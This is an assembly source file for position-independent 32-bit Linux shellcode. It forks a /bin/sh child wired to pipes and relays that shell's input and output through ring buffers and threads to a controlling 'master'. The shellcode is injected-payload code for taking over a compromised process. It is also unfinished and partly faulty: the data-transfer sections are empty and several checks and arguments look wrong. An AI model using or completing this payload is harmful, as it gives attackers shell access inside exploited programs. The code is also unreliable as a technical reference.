BITS 32

;		     #   1   2   3   4   5   6
; syscall arguments: EAX EBX ECX EDX ESI EDI EBP
; syscall return: EAX

start:
	call near shcode_start
shcode_start:
	pop	ebp
	sub	ebp, shcode_start
	add	ebp, data_start

	; pipe(m2sh)
	mov	eax,42
	mov	ebx,ebp
	add	ebx,m2sh_0
	int	0x80

	cmp	eax,0
	jne	child_dead_interleaved

	; pipe(sh2m)
	mov	eax,42
	mov	ebx,ebp
	add	ebx,sh2m_0
	int	0x80

	cmp	eax,0
	jne	child_dead_interleaved

	; fork()
	mov	eax,2
	int	0x80

	cmp	eax,0
	je	child
	jg	parent			; signed compare
child_dead_interleaved:
	jmp	child_dead

child:
	; dup2(m2sh[0], 0)   (dup to stdin)
	mov	eax,63
	mov	ebx,ebp
	add	ebx,m2sh_0
	mov	ebx, [ebx]
	xor	ecx,ecx
	int	0x80

	cmp	eax,ecx
	jne	leave_sh_interleaved

	; dup2(sh2m[1], 1)   (dup to stdout)
	mov	eax,63
	mov	ebx,ebp
	add	ebx,sh2m_1
	mov	ebx, [ebx]
	inc	ecx
	int	0x80

	cmp	eax,ecx
	jne	leave_sh_interleaved
	
	; dup2(sh2m[1], 2)   (dup to stderr)
	mov	eax,63
	mov	ebx,ebp
	add	ebx,sh2m_1
	mov	ebx, [ebx]
	inc	ecx
	int	0x80

	cmp	eax,ecx
	jne	leave_sh_interleaved

	; execve("/bin/sh", ["/bin/sh"], NULL)
	mov	eax,11
	mov	ebx,ebp
	add	ebx,execve_command
	mov	ecx,ebp
	add	ecx,foo
	xor	edx,edx
	mov	[ecx],ebx
	mov	[ecx+4],edx
	int	0x80

	; fail if execve did not work.
leave_sh_interleaved:
	jmp	leave_sh

parent:
	; remember child's PID
	mov	ebx,ebp
	add	ebx,child_pid
	mov	[ebx],eax

	; close(m2sh[0])
	mov	eax,6
	mov	ebx,ebp
	add	ebx,m2sh_0
	int	0x80

	; close(sh2m[1])
	mov	eax,6
	mov	ebx,ebp
	add	ebx,sh2m_1
	int	0x80

	; clone:
	; one thread for reader, one thread for writer
	mov	eax,120
	; CLONE_FS   | CLONE_FILES | CLONE_SIGHAND | CLONE_VM   | CLONE_THREAD
	; 0x00000200 | 0x00000400  | 0x00000800    | 0x00000100 | 0x00010000
	mov	ebx,0x00010f00
	mov	ecx,esp	; just use same stack. we don't need the stack, anyway.
	xor	edx,edx
	int	0x80

	cmp	eax,0
	; ret=0 -> clone
	je	thread_write_to_master	; clone is writer
	; ret>0 -> original
	jg	thread_read_from_master	; original is reader
	; error if ret<0
	jmp	child_dead

	; ==================================== the READER thread:
thread_read_from_master:
	; will write to child via m2sh[1]
	; remember RINGBUFFER from_master in esi
	mov	esi,ebp
	add	esi,rfrm_buffer

reader_while_fds_ok:
	; while both FDs are ok:
	mov	al,[ebp+to_child_ok]
	add	al,[ebp+from_child_ok]
	cmp	al,2
	jne	leave_sh_second_interleaved

	; test, if master requested child to be terminated
	mov	ebx,ebp
	add	ebx,terminate_child
	mov	al,[ebx]
	cmp	al,0
	je	do_terminate_child

	; if ringbuffer is EMPTY ( _reader == _writer ), do nothing.
	mov	eax,[ebp+rfrm_writer_pos]
	sub	eax,[ebp+rfrm_reader_pos]
	jz	reader_sleep

	; write a chunk to the child.




reader_sleep:
	; sleep some time...

	jmp	reader_while_fds_ok

do_terminate_child:
	; send a SIGKILL to child
	mov	eax,37
	mov	ebx,ebp
	add	ebx,child_pid
	mov	ebx,[ebx]
	mov	ecx,9	; SIGKILL
	int	0x80

	; clear to_child_ok
	xor	eax,eax
	mov	[ebp+to_child_ok], eax
	; and from_child_ok
	mov	[ebp+from_child_ok], eax
leave_sh_second_interleaved:
	jmp	leave_sh

	; ==================================== the WRITER thread:
thread_write_to_master:
	; will read from child via sh2m[0]
	; remember RINGBUFFER to_master in esi
	mov	esi,ebp
	add	esi,rto_writer_pos

writer_while_fds_ok:
	; while both FDs are ok:
	mov	al,[ebp+to_child_ok]
	add	al,[ebp+from_child_ok]
	cmp	al,2
	jne	child_dead

	; if ringbuffer is FULL ( _reader == _writer+1 ), do nothing.
	mov	eax,[ebp+rto_writer_pos]
	inc	eax
	sub	eax,[ebp+rto_reader_pos]
	jz	writer_sleep

	; read ONE SINGLE BYTE and pass it into the buffer.




	; we don't need to sleep inside the loop. only sleep, if ringbuffer is full.
	; read() will block if there is no data from child.
	jmp	writer_while_fds_ok

writer_sleep:
	; FIXME
	; sleep some time... BUT NOT TOO LONG...!

	jmp	writer_while_fds_ok

	; ==================================================================

child_dead:
	; at most wait 2 seconds for master's ACK
	xor	eax,eax
	cmp	[ebp+child_is_dead_ACK], al
	jne	leave_sh
	mov	al,2
	cmp	[ebp+child_is_dead], al
	ja	leave_sh

	inc byte [ebp]

	; usleep(1,0):
	mov	eax, 162
	mov	ebx, ebp
	add	ebx, foo
	mov	ecx, ebx
	xor	edx,edx
	mov long [ebx+4], edx		; nanoseconds
	inc	edx
	mov long [ebx], edx		; seconds
	int	0x80

	jmp	child_dead

leave_sh:
	; exit-point for BOTH parent:writer&reader and child in case of fail
	xor	ebx,ebx
	mov	eax,ebx
	inc	eax
	int	0x80

; =============================================================================
; DATA
data_start EQU $

; do not change order of the following stuff!

child_is_dead EQU $ - data_start
	db		0
child_is_dead_ACK EQU $ - data_start
	db		0

terminate_child	EQU $ - data_start
	db		0

to_child_ok EQU $ - data_start
	db		1
from_child_ok EQU $ - data_start
	db		1

; a ringbuffer is EMPTY, if both _writer and _reader point to the same location.
; a ringbuffer is FULL, if _reader == _writer+1

; ringbuffer from_master:

rfrm_writer_pos EQU $ - data_start
	db		0
rfrm_reader_pos EQU $ - data_start
	db		0

; ringbuffer to_master:

rto_writer_pos EQU $ - data_start
	db		0
rto_reader_pos EQU $ - data_start
	db		0

execve_command	db	'/bin/sh',0

; =============================================================================
; stuff that is not required to be initialized:
align 4

child_pid EQU $ - data_start

; pipes middleman<->shell
m2sh_0 EQU $ - data_start + 4			; shell reads
m2sh_1 EQU $ - data_start + 8			; master writes
sh2m_0 EQU $ - data_start + 12			; master reads
sh2m_1 EQU $ - data_start + 16			; shell writes

rfrm_buffer EQU $ - data_start + 20		; FROM master
rto_buffer EQU $ - data_start + 276		; TO master

foo EQU $ - data_start + 532
bar EQU $ - data_start + 536
baz EQU $ - data_start + 540
qux EQU $ - data_start + 544

